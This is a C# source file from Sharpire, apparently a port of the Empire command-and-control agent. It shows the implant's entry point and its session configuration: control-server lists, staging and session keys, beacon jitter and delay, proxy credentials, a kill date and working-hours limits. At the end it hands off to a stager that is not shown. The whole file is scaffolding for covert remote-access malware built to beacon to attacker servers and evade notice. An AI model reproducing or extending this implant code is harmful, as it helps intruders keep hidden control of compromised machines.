using System;
using System.Configuration;
using System.Linq;
using System.Text.RegularExpressions;

namespace Sharpire
{
    class Program
    {
        static void Main(string[] args)
        {

#if (COMMAND_LINE)
            if (args.Length < 3)
                return;
            SessionInfo sessionInfo = new SessionInfo(args);
#endif

#if (COMPILE_TIME)
            SessionInfo sessionInfo = new SessionInfo();
#endif

#if (PRINT)
            Console.WriteLine("EmpireServer:  {0}", sessionInfo.GetControlServers());
            Console.WriteLine("StagingKey:    {0}", sessionInfo.GetStagingKey());
            Console.WriteLine("AgentLanguage: {0}", sessionInfo.GetAgentLanguage());
#endif
            (new EmpireStager(sessionInfo)).Execute();
        }
    }

    sealed class SessionInfo
    {
        private string[] ControlServers;
        private readonly string StagingKey;
        private byte[] StagingKeyBytes;
        private readonly string AgentLanguage;

        private string[] TaskURIs;
        private string UserAgent;
        private double DefaultJitter;
        private uint DefaultDelay;
        private uint DefaultLostLimit;

        private string StagerUserAgent;
        private string StagerURI;
        private string Proxy;
        private string ProxyCreds;
        private DateTime KillDate;
        private DateTime WorkingHoursStart;
        private DateTime WorkingHoursEnd;
        private string AgentID;
        private string SessionKey;
        private byte[] SessionKeyBytes;

        public SessionInfo()
        {
            ControlServers = ConfigurationManager.AppSettings["ControlServers"].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            StagingKey = ConfigurationManager.AppSettings["StagingKey"];
            AgentLanguage = ConfigurationManager.AppSettings["AgentLanguage"];

            SetDefaults();
        }

        public SessionInfo(string[] args)
        {
            ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            StagingKey = args[1];
            AgentLanguage = args[2];

            SetDefaults();
        }

        private void SetDefaults()
        {
            StagingKeyBytes = System.Text.Encoding.ASCII.GetBytes(StagingKey);
            TaskURIs = ConfigurationManager.AppSettings["TaskURIs"].Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            UserAgent = ConfigurationManager.AppSettings["UserAgent"];
            double.TryParse(ConfigurationManager.AppSettings["DefaultJitter"], out DefaultJitter);
            uint.TryParse(ConfigurationManager.AppSettings["DefaultDelay"], out DefaultDelay);
            uint.TryParse(ConfigurationManager.AppSettings["DefaultLostLimit"], out DefaultLostLimit);

            StagerUserAgent = ConfigurationManager.AppSettings["StagerUserAgent"];
            if (string.IsNullOrEmpty(StagerUserAgent))
            {
                StagerUserAgent = UserAgent;
            }
            StagerURI = ConfigurationManager.AppSettings["StagerURI"];
            Proxy = ConfigurationManager.AppSettings["Proxy"];
            ProxyCreds = ConfigurationManager.AppSettings["ProxyCreds"];

            string KillDate = ConfigurationManager.AppSettings["KillDate"];
            if (!string.IsNullOrEmpty(KillDate))
            {
                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");

                if (regex.Match(KillDate).Success)
                    DateTime.TryParse(KillDate, out this.KillDate);
            }

            string WorkingHours = ConfigurationManager.AppSettings["WorkingHours"];
            if (!string.IsNullOrEmpty(WorkingHours))
            {
                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");

                string start = WorkingHours.Split(',').First();
                if (regex.Match(start).Success)
                    DateTime.TryParse(start, out WorkingHoursStart);

                string end = WorkingHours.Split(',').Last();
                if (regex.Match(end).Success)
                    DateTime.TryParse(end, out WorkingHoursEnd);
            }
        }

        public string[] GetControlServers() { return ControlServers; }
        public string GetStagingKey() { return StagingKey; }
        public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
        public string GetAgentLanguage() { return AgentLanguage; }

        public string[] GetTaskURIs() { return TaskURIs; }
        public string GetUserAgent() { return UserAgent; }
        public double GetDefaultJitter() { return DefaultJitter; }
        public uint   GetDefaultDelay() { return DefaultDelay; }
        public uint   GetDefaultLostLimit() { return DefaultLostLimit; }

        public string GetStagerUserAgent() { return StagerUserAgent; }
        public string GetStagerURI() { return StagerURI; }
        public string GetProxy() { return Proxy; }
        public string GetProxyCreds() { return ProxyCreds; }
        public DateTime GetKillDate() { return KillDate; }

        public void SetWorkingHoursStart(DateTime WorkingHoursStart)
        {
            this.WorkingHoursStart = WorkingHoursStart;
        }
        public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
        public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }

        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
        public string GetAgentID() { return AgentID; }

        public void SetSessionKey(string SessionKey)
        {
            this.SessionKey = SessionKey;
            SessionKeyBytes = System.Text.Encoding.ASCII.GetBytes(SessionKey);
        }
        public string GetSessionKey() { return SessionKey; }
        public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
    }
}
